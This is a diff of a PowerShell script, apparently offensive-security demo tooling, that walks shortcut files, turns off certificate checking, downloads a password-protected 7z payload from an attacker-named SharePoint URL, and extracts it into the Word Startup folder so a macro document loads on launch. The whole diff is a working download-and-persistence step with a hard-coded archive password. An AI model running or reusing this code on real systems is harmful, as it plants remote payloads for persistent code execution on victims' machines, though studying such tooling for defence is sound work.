@@ -16,11 +16,20 @@ foreach ($file in $LNK)
 	}
 	
 #Sharepoint URL - Substitute guestaccess.aspx with download.aspx
-$Url = "https://eviler-my.sharepoint.com/personal/badguy_eviler_onmicrosoft_com/_layouts/15/download.aspx?docid=13e2671c5e3cf41a99c3b4ddca9d3e313&authkey=Ab7LB1TuDzCM7pf8EUqDWok"
-$Path = $env:USERPROFILE + "\AppData\Roaming\Microsoft\Word\Startup\Totally-Legitimate-Document.docm"
+#$ZipPath = Join-Path -Path $env:USERPROFILE -ChildPath "\AppData\Roaming\Microsoft\Word\Startup\Latest-Forms.7z"
+$LocalDir = Convert-Path .
+$Path = $LocalDir + "\Latest-Forms.7z"
+$ExtractPath = Join-Path -Path $env:USERPROFILE -ChildPath "\AppData\Roaming\Microsoft\Word\Startup\"
+$Url = "https://eviler-my.sharepoint.com/personal/badguy_eviler_onmicrosoft_com/_layouts/15/download.aspx?docid=1432aadf08ea24739b1f6e036dfa554a7&authkey=ATdXKOSTNmKkZ6E4a2pJ3Us"
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $webClient = new-object System.Net.WebClient
 $webClient.DownloadFile( $Url, $Path )
+sleep 2
+
+#Unzip and decrypt Payload - File: Latest-Forms.zip Password `BlackHat2017-Password12345`
+#Alais
+set-alias 7z "C:\Program Files\7-Zip\7z.exe"
+7z e .\Latest-Forms.7z -pBlackHat2017-Password12345 -oC:\Users\$env:USERNAME\APPData\Roaming\Microsoft\Word\Startup\
 
 #Delete Files
 
